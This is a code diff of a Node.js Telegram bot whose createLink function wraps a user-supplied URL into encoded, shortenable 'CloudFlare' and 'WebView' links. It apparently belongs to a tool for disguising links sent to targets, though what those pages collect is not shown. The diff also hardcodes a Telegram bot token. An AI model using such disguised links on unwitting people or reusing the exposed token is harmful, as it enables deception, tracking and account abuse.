@@ -7,6 +7,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot("7450734172:AAFGuD6_aS6X0dl2X5CDQ9Mr_9eJNQ8rBVk", {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+const btoa = require('btoa');
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
@@ -107,51 +108,49 @@ bot.on('polling_error', (error) => {
 
 
 
-async function createLink(cid,msg){
 
-var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
-if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
-var url=cid.toString(36)+'/'+btoa(msg);
-var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
-};
+async function createLink(cid, msg) {
+  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
-  
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
+    var url = cid.toString(36) + '/' + btoa(unescape(encodeURIComponent(msg))); // Encode msg properly
+    var m = {
+      reply_markup: JSON.stringify({
+        "inline_keyboard": [
+          [{ text: "Create new Link", callback_data: "crenew" }]
+        ]
+      })
+    };
 
-var f="",g="";
+    var cUrl = `${hostURL}/c/${url}`;
+    var wUrl = `${hostURL}/w/${url}`;
 
-for(var c in x){
-f+=x[c]+"\n";
-}
+    bot.sendChatAction(cid, "typing");
 
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
+    if (use1pt) {
+      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
-}
-else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
+      var f = "", g = "";
 
-}  
-}
+      for (var c in x) {
+        f += x[c] + "\n";
+      }
 
+      for (var c in y) {
+        g += y[c] + "\n";
+      }
+
+      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
+    } else {
+      bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+    }
+  } else {
+    bot.sendMessage(cid, `⚠️ Please enter a valid URL, including http or https.`);
+    createNew(cid);
+  }
+      }
 
 function createNew(cid){
 var mk={
